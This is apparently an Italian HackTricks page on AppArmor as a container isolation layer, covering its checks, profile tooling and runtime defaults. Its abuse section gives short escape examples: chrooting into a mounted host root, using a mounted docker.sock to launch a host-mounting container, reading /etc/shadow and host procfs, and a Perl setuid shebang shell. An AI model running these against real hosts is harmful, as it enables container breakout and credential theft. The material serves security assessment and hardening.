# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Controllo degli Accessi Obbligatorio** che applica restrizioni tramite profili per singolo programma. A differenza dei controlli DAC tradizionali, che dipendono molto dalla proprietà di utenti e gruppi, AppArmor permette al kernel di applicare una policy legata direttamente al processo. Negli ambienti containerizzati questo è importante perché un workload potrebbe avere sufficienti privilegi tradizionali per tentare un'azione e comunque essere negato perché il suo profilo AppArmor non permette il percorso, il mount, il comportamento di rete o l'uso della capability rilevante.

Il punto concettuale più importante è che AppArmor è basato sui percorsi. Ragiona sull'accesso al filesystem attraverso regole sui percorsi piuttosto che tramite etichette come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout di percorsi alternativi meritano attenzione. Se lo stesso contenuto dell'host diventa raggiungibile sotto un percorso diverso, l'effetto della policy potrebbe non essere quello che l'operatore si aspettava inizialmente.

## Ruolo nell'isolamento dei container

Le revisioni di sicurezza dei container spesso si fermano a capabilities e seccomp, ma AppArmor continua a essere importante anche dopo quei controlli. Immagina un container che ha più privilegi del dovuto, o un workload che ha bisogno di una capability in più per motivi operativi. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, la rete e i pattern di esecuzione in modi che fermano il percorso di abuso più ovvio. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione rischiosa in una che è attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere sotto quale contesto è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor legato al profilo scelto dal runtime. Nel caso non confinato, quello strato aggiuntivo di restrizione scompare.

Puoi anche ispezionare ciò che Docker pensa di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso a runtime

Docker può applicare un profilo AppArmor predefinito o custom quando l'host lo supporta. Anche Podman può integrarsi con AppArmor su sistemi basati su AppArmor, sebbene sulle distribuzioni orientate a SELinux l'altro sistema MAC spesso prenda il ruolo principale. Kubernetes può esporre policy AppArmor a livello di carico di lavoro sui nodi che effettivamente supportano AppArmor. LXC e gli ambienti container di sistema della famiglia Ubuntu usano anch'essi AppArmor in modo estensivo.

Il punto pratico è che AppArmor non è una "Docker feature". È una caratteristica del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o al runtime viene detto di girare unconfined, la presunta protezione in realtà non c'è.

Sugli host AppArmor con supporto per Docker, il default più noto è `docker-default`. Quel profilo è generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati su capability falliscono ancora in un container di default. In termini generali, `docker-default` permette il networking ordinario, nega scritture a gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e restringe ptrace in modo che non sia una primitiva generale per sondare l'host. Capire quella baseline aiuta a distinguere tra "il container ha `CAP_SYS_ADMIN`" e "il container può effettivamente usare quella capability contro le interfacce kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono di solito memorizzati sotto `/etc/apparmor.d/`. Una convenzione di nomenclatura comune è sostituire le slash nel path dell'eseguibile con dei punti. Per esempio, un profilo per `/usr/bin/man` è comunemente memorizzato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è rilevante sia in fase di difesa sia in fase di assessment perché una volta che si conosce il nome del profilo attivo, spesso è possibile individuare rapidamente il file corrispondente sull'host.

I comandi utili per la gestione lato host includono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La ragione per cui questi comandi sono importanti in una guida su container-security è che spiegano come i profili vengono effettivamente creati, caricati, passati in complain mode e modificati dopo le variazioni dell'applicazione. Se un operatore ha l'abitudine di mettere i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può sembrare protetto nella documentazione ma comportarsi molto più permissivamente nella realtà.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e aiutare a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo modello che può poi essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy necessita di aggiornamento, `aa-logprof` può riprodurre i dinieghi presenti nei log e aiutare l'operatore a decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Logs

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog, o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile operativamente e in ambito offensivo. Defenders lo usano per perfezionare i profili. Attackers lo usano per capire quale percorso o operazione esatta viene negata e se AppArmor è il controllo che blocca una catena di exploit.

### Individuare il file di profilo esatto

Quando un runtime mostra un nome specifico di profilo AppArmor per un container, spesso è utile mappare quel nome al file del profilo sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dice che è in esecuzione con il profilo `lowpriv`" e "le regole effettive si trovano in questo file specifico che può essere verificato o ricaricato".

## Malconfigurazioni

Il più ovvio errore è `apparmor=unconfined`. Gli amministratori spesso lo impostano mentre fanno il debug di un'applicazione che è fallita perché il profilo ha correttamente bloccato qualcosa di pericoloso o inaspettato. Se il flag rimane in produzione, l'intero layer MAC è di fatto rimosso.

Un altro problema sottile è presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor è path-based, esporre host paths sotto posizioni di mount alternative può interagire male con le regole basate sui path. Un terzo errore è dimenticare che un nome di profilo in un file di configurazione significa ben poco se il host kernel non sta effettivamente imponendo AppArmor.

## Abusi

Quando AppArmor non c'è più, operazioni che prima erano vincolate possono improvvisamente funzionare: leggere percorsi sensibili tramite bind mounts, accedere a parti di procfs o sysfs che avrebbero dovuto restare più difficili da usare, eseguire azioni legate ai mount se capabilities/seccomp lo permettono, o usare percorsi che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato su capability "dovrebbe funzionare" sulla carta ma fallisce comunque nella pratica. Rimuovi AppArmor, e lo stesso tentativo può cominciare a riuscire.

Se sospetti che AppArmor sia la principale cosa che impedisce una catena di abuso basata su path-traversal, bind-mount, o mount-based, il primo passo è di solito confrontare cosa diventa accessibile con e senza un profilo. Per esempio, se un host path è montato dentro il container, inizia verificando se puoi attraversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container ha anche una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici è verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso a filesystem kernel sensibili:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare una vulnerabilità di information-disclosure in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Il punto di questi comandi non è che AppArmor da solo crei il breakout. Si tratta del fatto che, una volta rimosso AppArmor, molte filesystem e mount-based abuse paths diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + Host Root Mounted

Se il container ha già il host root bind-mounted in `/host`, rimuovere AppArmor può trasformare un blocked filesystem abuse path in un completo host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita attraverso l'host filesystem, il workload è effettivamente uscito dal confine del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + Runtime socket

Se la vera barriera era AppArmor attorno allo stato runtime, un socket montato può essere sufficiente per un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal mount point, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso all'API di runtime, e l'API di runtime può avviare un container che compromette l'host.

### Esempio completo: Bypass basato sul percorso tramite bind-mount

Poiché AppArmor è basato sui percorsi, proteggere `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa venga effettivamente montato e se il percorso alternativo aggiri anche altri controlli, ma questo schema è una delle ragioni più chiare per cui AppArmor deve essere valutato insieme alla disposizione dei mount e non in isolamento.

### Esempio completo: Shebang Bypass

La policy di AppArmor a volte prende di mira un percorso dell'interprete in modo che non tenga pienamente conto dell'esecuzione degli script tramite la gestione dello shebang. Un esempio storico coinvolse l'uso di uno script la cui prima riga punta a un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante come promemoria che l'intento del profilo e la semantica di esecuzione effettiva possono divergere. Quando si esamina AppArmor negli ambienti container, le catene di interpreti e i percorsi di esecuzione alternativi meritano particolare attenzione.

## Controlli

Lo scopo di questi controlli è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host? Il processo corrente è confinato? E il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Cosa è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il workload non trae beneficio dal confinamento AppArmor.
- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella runtime config è per lo più cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo custom inaspettato, spesso quella è la ragione per cui un percorso di abuso basato su filesystem o mount funziona.

Se un container ha già privilegi elevati per ragioni operative, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e una falla di sicurezza molto più ampia.

## Impostazioni predefinite di runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita su host con supporto AppArmor | Usa il profilo AppArmor `docker-default` a meno che non sia sovrascritto | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma il valore predefinito esatto dipende dall'host/runtime ed è meno uniforme rispetto al profilo `docker-default` documentato di Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
| containerd / CRI-O sotto Kubernetes | Segue il supporto del nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'applicazione effettiva dipende ancora dal supporto del nodo e dalle impostazioni del workload | Stesso della riga Kubernetes; la configurazione diretta del runtime può anche saltare completamente AppArmor |

Per AppArmor, la variabile più importante è spesso il **host**, non solo il runtime. Una impostazione di profilo in un manifest non crea confinamento su un nodo dove AppArmor non è abilitato.
